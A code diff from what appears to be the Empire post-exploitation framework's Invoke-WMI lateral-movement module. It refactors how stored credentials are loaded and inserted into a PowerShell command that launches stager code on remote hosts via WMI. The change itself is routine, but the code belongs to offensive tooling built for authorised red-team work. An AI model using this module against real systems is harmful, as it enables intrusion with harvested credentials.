@@ -3,6 +3,7 @@ from __future__ import print_function
 from builtins import str
 from builtins import object
 
+from empire.server.database.models import Credential
 from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
@@ -22,8 +23,6 @@ class Module(object):
         user_agent = params['UserAgent']
         proxy = params['Proxy']
         proxy_creds = params['ProxyCreds']
-        username = params['UserName']
-        password = params['Password']
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
@@ -47,14 +46,14 @@ class Module(object):
                 print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
-            (cred_id, cred_type, domain_name, username, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
+            cred: Credential = main_menu.credentials.get_credentials(cred_id)
 
-            if domain_name != "":
-                params["UserName"] = str(domain_name) + "\\" + str(username)
+            if cred.domain != "":
+                params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
             else:
-                params["UserName"] = str(username)
-            if password != "":
-                params["Password"] = password
+                params["UserName"] = str(cred.username)
+            if cred.password != "":
+                params["Password"] = cred.password
 
 
         if not main_menu.listeners.is_listener_valid(listener_name) and not command:
@@ -87,8 +86,8 @@ class Module(object):
         script += " -ArgumentList \"" + stagerCode + "\""
 
         # if we're supplying alternate user credentials
-        if username != '':
-            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+username+"\",$PSPassword);" + script + " -Credential $Credential"
+        if params["UserName"] != '':
+            script = "$PSPassword = \""+params["Password"]+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+params["UserName"]+"\",$PSPassword);" + script + " -Credential $Credential"
 
             script += ";'Invoke-Wmi executed on " +computer_names +"'"
 
